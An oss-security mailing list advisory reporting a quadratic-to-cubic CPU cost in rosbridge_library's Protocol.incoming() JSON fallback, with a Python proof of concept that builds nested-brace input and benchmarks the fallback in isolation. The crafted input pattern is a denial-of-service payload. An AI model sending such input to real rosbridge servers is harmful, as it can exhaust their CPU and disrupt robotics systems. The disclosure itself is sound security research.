X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/14/28
Message-ID: <CADCSfHUqviT_t31RU18UJf6ENcS3kLP4Y6kmj_W=k9Oda5osvw@mail.gmail.com>
Date: Mon, 14 Sep 2026 21:00:05 +0300
From: Evgenios Gkritsis <evgeniosgkritsis@...il.com>
To: oss-security@...ts.openwall.com
Subject: rosbridge_library Protocol.incoming() quadratic CPU cost in JSON fallback
Content-Type: text/plain; charset=utf-8

Hello,

I am reporting an algorithmic-complexity defect in
rosbridge_library.protocol.Protocol.incoming() in rosbridge_suite. It is
present in the current code on the ros2 branch and was not removed by PR
#1199.

Affected:

Product:  rosbridge_suite (rosbridge_library)
Component: Protocol.incoming() JSON fallback
Versions: current ros2 branch; present since the fallback was introduced
CWE:  CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050


Vulnerable code:

When json.loads(buffer) fails, incoming() falls back to scanning the buffer
for every { and } pair:

```python
#!/usr/bin/env python3

import json
import math
import statistics
import time


def vulnerable_fallback(buffer: str):
    """
    Reproduce the current rosbridge Protocol.incoming() fallback:

        opening_brackets = [...]
        closing_brackets = [...]

        for start in opening_brackets:
            for end in closing_brackets:
                try:
                    json.loads(buffer[start:end + 1])
                except Exception:
                    pass

    We deliberately provide JSON which cannot produce a valid message,
    so the nested loops have to exhaust their candidates.
    """

    opening_brackets = [
        i for i, letter in enumerate(buffer)
        if letter == "{"
    ]

    closing_brackets = [
        i for i, letter in enumerate(buffer)
        if letter == "}"
    ]

    attempts = 0

    for start in opening_brackets:
        for end in closing_brackets:
            attempts += 1

            try:
                msg = json.loads(buffer[start:end + 1])

                if isinstance(msg, dict) and msg.get("op") is not None:
                    return attempts

            except Exception:
                pass

    return attempts


def build_input(n: int) -> str:
    """
    Prevent any candidate substring from being valid JSON.

    Every opening brace is followed by a syntactically incomplete
    JSON object fragment, so the fallback keeps trying candidates.
    """

    return '{"x":' * n + '}' * n


def benchmark(n: int, repeats: int = 3):
    data = build_input(n)

    times = []
    attempts = None

    for _ in range(repeats):
        t0 = time.perf_counter()

        result = vulnerable_fallback(data)

        elapsed = time.perf_counter() - t0

        times.append(elapsed)
        attempts = result

    return (
        len(data),
        attempts,
        statistics.median(times),
    )


def main():
    print("=== rosbridge JSON fallback complexity PoC ===")
    print()

    sizes = [
        50,
        100,
        200,
        400,
        800,
        1200,
        1600,
        2400,
    ]

    results = []

    print(
        f"{'n':>8} "
        f"{'bytes':>10} "
        f"{'attempts':>14} "
        f"{'median(s)':>12}"
    )
    print("-" * 52)

    for n in sizes:
        size, attempts, elapsed = benchmark(n)

        print(
            f"{n:>8} "
            f"{size:>10} "
            f"{attempts:>14,} "
            f"{elapsed:>12.6f}"
        )

        results.append((n, elapsed))

    print()
    print("Local scaling exponent:")

    for (n1, t1), (n2, t2) in zip(
        results,
        results[1:],
    ):
        if t1 > 0 and t2 > 0:
            k = math.log(t2 / t1) / math.log(n2 / n1)
            print(
                f"{n1:>5} -> {n2:<5}: k={k:.3f}"
            )


if __name__ == "__main__":
    main()
```
For a buffer with n opening braces and n closing braces, this performs n²
calls to json.loads().
Each call also slices buffer[start:end + 1], which is a full string copy
--> so the aggregate cost is worse than quadratic.

PoC and measurements:

I measured the fallback in isolation with a buffer of n balanced brace
pairs that contains no valid JSON substring, so every inner json.loads()
call fails and the full loop runs:

text
       n      bytes       attempts    median(s)
----------------------------------------------------
      50        300          2,500     0.012958
     100        600         10,000     0.047005
     200       1200         40,000     0.284308
     400       2400        160,000     0.974249
     800       4800        640,000     7.461380
    1200       7200      1,440,000    25.122452
    1600       9600      2,560,000    58.779579
    2400      14400      5,760,000   200.800991

Local scaling exponent (largest intervals):
   800 -> 1200 : k=2.994
  1200 -> 1600 : k=2.955
  1600 -> 2400 : k=3.030
The exponent of ~3.0 is consistent with the nested loop plus per-iteration
slice: O(n²) iterations, each costing O(n) for the slice copy.

Relationship to PR #1199:

PR #1199 by tomqext fixed the binary-WebSocket path that made this fallback
run on every message. The PR description states the fallback "is still
there for TCP fragmentation, it just stops being the hot path." The O(n²)
loop was not removed; it was made harder to reach accidentally. This report
concerns the loop itself, not the binary-frame bug that PR #1199 addressed.

Reachability (what I have and have not verified):

The PoC drives the fallback function directly. I have not completed an
end-to-end test through the WebSocket or TCP transport, so I cannot state
the exact frame size an unauthenticated client would need to send. However,
the fallback exists specifically to handle partial or concatenated messages
arriving over TCP, so reaching it should not require malformed input; a
legitimate client sending a fragmented message can trigger it.


I am reporting now because the code path is present and measurable, and the
fix is independent of the reachability question.


Credit:
Evgenios Gkritsis, Athena Research Center & University of Piraeus, Athens,
Greece
Constantinos Patsakis, Athena Research Center & University of Piraeus,
Athens, Greece
George C. Stergiopoulos, Athens University of Economics and Business,
Athens, Greece

I plan to reference this in a research paper on algorithmic-complexity
vulnerabilities in protocol parsers. I will not disclose publicly until a
fix is published or 90 days have passed.

Thank you.

